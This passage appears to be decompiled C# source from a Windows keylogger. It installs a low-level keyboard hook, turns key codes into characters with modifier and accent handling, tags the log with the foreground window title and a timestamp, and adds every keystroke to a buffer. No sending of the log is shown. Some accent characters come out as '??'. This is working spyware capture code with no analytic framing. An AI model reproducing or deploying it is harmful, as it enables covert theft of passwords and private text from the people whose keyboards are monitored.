		keycodes_0.Add(234);
		keycodes_0.Add(235);
		keycodes_0.Add(236);
		keycodes_0.Add(237);
		keycodes_0.Add(238);
		keycodes_0.Add(239);
		keycodes_0.Add(240);
		keycodes_0.Add(241);
		keycodes_0.Add(242);
		keycodes_0.Add(243);
		keycodes_0.Add(244);
		keycodes_0.Add(245);
		keycodes_0.Add(246, "[ATTN]");
		keycodes_0.Add(247, "[CRSEL]");
		keycodes_0.Add(248, "[EXSEL]");
		keycodes_0.Add(249, "[ERASE EOF]");
		keycodes_0.Add(250, "[PLAY]");
		keycodes_0.Add(251, "[ZOOM]");
		keycodes_0.Add(252);
		keycodes_0.Add(253);
		keycodes_0.Add(254, "[CLEAR]");
		keycodes_0.Add(255);
	}

	public object method_0()
	{
		return intptr_0 != (IntPtr)0;
	}

	public int method_1(int int_3, int int_4, ref KBDLLHOOKSTRUCT kbdllhookstruct_0)
	{
		string_2 = "";
		string text = method_3();
		if (Operators.CompareString(text, string_0, false) != 0)
		{
			string_0 = text;
			string_2 = "\r\n\r\nAPP : " + text + " (" + DateAndTime.get_Now().ToString() + ")\r\n";
		}
		string text2 = "";
		if ((int_4 == short_0) | (int_4 == int_1))
		{
			switch (kbdllhookstruct_0.vkCode)
			{
			case 20:
				if (!bool_11)
				{
					bool_12 = !bool_12;
				}
				bool_11 = true;
				break;
			case 91:
				bool_9 = true;
				break;
			case 92:
				bool_8 = true;
				break;
			case 160:
				bool_4 = true;
				break;
			case 161:
				bool_3 = true;
				break;
			case 162:
				bool_0 = true;
				break;
			case 163:
				bool_1 = true;
				break;
			case 164:
				bool_6 = true;
				break;
			case 165:
				bool_7 = true;
				break;
			}
		}
		if ((int_4 == int_0) | (int_4 == int_2))
		{
			switch (kbdllhookstruct_0.vkCode)
			{
			case 20:
				bool_11 = false;
				break;
			case 91:
				bool_9 = false;
				break;
			case 92:
				bool_8 = false;
				break;
			case 160:
				bool_4 = false;
				break;
			case 161:
				bool_3 = false;
				break;
			case 162:
				bool_0 = false;
				break;
			case 163:
				bool_1 = false;
				break;
			case 164:
				bool_6 = false;
				if (string_3.Length > 0)
				{
					int a = Conversions.ToInteger(string_3);
					int result;
					if (Operators.CompareString(Conversions.ToString(string_3[0]), "0", false) == 0)
					{
						Math.DivRem(a, 256, out result);
						text2 = string_4[result + 256, 1];
					}
					else
					{
						Math.DivRem(a, 256, out result);
						text2 = string_4[result, 1];
					}
				}
				string_3 = "";
				break;
			case 165:
				bool_7 = false;
				break;
			}
		}
		bool_2 = bool_1 | bool_0;
		bool_5 = bool_4 | bool_3;
		bool_10 = bool_9 | bool_8;
		if (bool_2 & bool_6)
		{
			bool_7 = true;
		}
		if ((int_4 == short_0) | (int_4 == int_1))
		{
			bool capsLock = ((Computer)MyProject.MyComputer_0).get_Keyboard().get_CapsLock();
			if (!bool_2 & !bool_6 & !bool_5 & !bool_10 & !bool_7)
			{
				text2 = ((!capsLock) ? keycodes_0[kbdllhookstruct_0.vkCode].Ret_Base : keycodes_0[kbdllhookstruct_0.vkCode].Ret_Shft);
			}
			if (bool_2 & !bool_6 & !bool_5 & !bool_10 & !bool_7)
			{
				text2 = keycodes_0[kbdllhookstruct_0.vkCode].Ret_Ctrl;
			}
			if (!bool_2 & !bool_6 & bool_5 & !bool_10 & !bool_7)
			{
				text2 = ((!capsLock) ? keycodes_0[kbdllhookstruct_0.vkCode].Ret_Shft : keycodes_0[kbdllhookstruct_0.vkCode].Ret_Base);
			}
			if (bool_7 & (bool_2 | bool_6) & !bool_10 & !bool_5)
			{
				text2 = keycodes_0[kbdllhookstruct_0.vkCode].Ret_AltGr;
			}
			if (bool_10 & !bool_2 & !bool_5 & !bool_6 & !bool_7)
			{
				text2 = keycodes_0[kbdllhookstruct_0.vkCode].Ret_Win;
			}
			if (bool_6 & !bool_2 & !bool_5 & !bool_7 & !bool_10)
			{
				string ret_Base = keycodes_0[kbdllhookstruct_0.vkCode].Ret_Base;
				if (ret_Base.Length != 0 && ((Strings.Asc(ret_Base) >= 48) & (Strings.Asc(ret_Base) <= 57)) && bool_6)
				{
					string_3 += ret_Base;
				}
				text2 = keycodes_0[kbdllhookstruct_0.vkCode].Ret_Alt;
			}
			if (char_0 != 0)
			{
				text2 = method_2(text2, kbdllhookstruct_0.vkCode, keycodes_0[kbdllhookstruct_0.vkCode].Ret_AccTrans);
			}
			if ((Operators.CompareString(text2, "^", false) == 0) | (Operators.CompareString(text2, "\u00a8", false) == 0) | (Operators.CompareString(text2, "~", false) == 0) | (Operators.CompareString(text2, "`", false) == 0))
			{
				char_0 = Conversions.ToChar(text2);
				text2 = "";
			}
		}
		string_1 = string_1 + string_2 + text2;
		return CallNextHookEx((int)intptr_0, int_3, int_4, kbdllhookstruct_0);
	}

	private string method_2(string string_5, int int_3, int int_4)
	{
		string[,] array = new string[12, 4]
		{
			{ "??", "??", "??", "??" },
			{ "??", "??", "~e", "??" },
			{ "??", "??", "~i", "??" },
			{ "??", "??", "??", "??" },
			{ "??", "??", "~u", "??" },
			{ "??", "??", "??", "??" },
			{ "??", "??", "~E", "??" },
			{ "??", "??", "~I", "??" },
			{ "??", "??", "??", "??" },
			{ "??", "??", "~U", "??" },
			{ "^n", "\u00a8n", "??", "`n" },
			{ "^N", "\u00a8N", "??", "`N" }
		};
		if ((Operators.CompareString(string_5, "^", false) == 0) | (Operators.CompareString(string_5, "\u00a8", false) == 0) | (Operators.CompareString(string_5, "~", false) == 0) | (Operators.CompareString(string_5, "`", false) == 0))
		{
			string result = Conversions.ToString(char_0) + string_5;
			char_0 = '\0';
			return result;
		}
		int num = default(int);
		switch (char_0)
		{
		case '^':
			num = 0;
			break;
		case '\u00a8':
			num = 1;
			break;
		case '~':
			num = 2;
			break;
		case '`':
			num = 3;
			break;
		}
		switch (int_4)
		{
		case 0:
			return string_5;
		case 1:
		{
			string result2 = Conversions.ToString(char_0) + string_5;
			char_0 = '\0';
			return result2;
		}
		case 2:
			switch (string_5)
			{
			case "a":
				char_0 = '\0';
				return array[0, num];
			case "e":
				char_0 = '\0';
				return array[1, num];
			case "i":
				char_0 = '\0';
				return array[2, num];
			case "o":
				char_0 = '\0';
				return array[3, num];
			case "u":
				char_0 = '\0';
				return array[4, num];
			case "A":
				char_0 = '\0';
				return array[5, num];
			case "E":
				char_0 = '\0';
				return array[6, num];
			case "I":
				char_0 = '\0';
				return array[7, num];
			case "O":
				char_0 = '\0';
				return array[8, num];
			case "U":
				char_0 = '\0';
				return array[9, num];
			case "n":
				char_0 = '\0';
				return array[10, num];
			case "N":
				char_0 = '\0';
				return array[11, num];
			}
			break;
		}
		return "";
	}

	private string method_3()
	{
		string string_ = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref string_, 100);
		return string_.Substring(0, Strings.InStr(string_, "\0", (CompareMethod)0) - 1);
	}

	public void method_4()
	{
		if (UnhookWindowsHookEx((int)intptr_0) != 0)
		{
			intptr_0 = (IntPtr)0;
		}
	}

	public void method_5()
	{
		keyboardHookDelegate_0 = method_1;
		intptr_0 = (IntPtr)SetWindowsHookExA(13, keyboardHookDelegate_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
	}
}
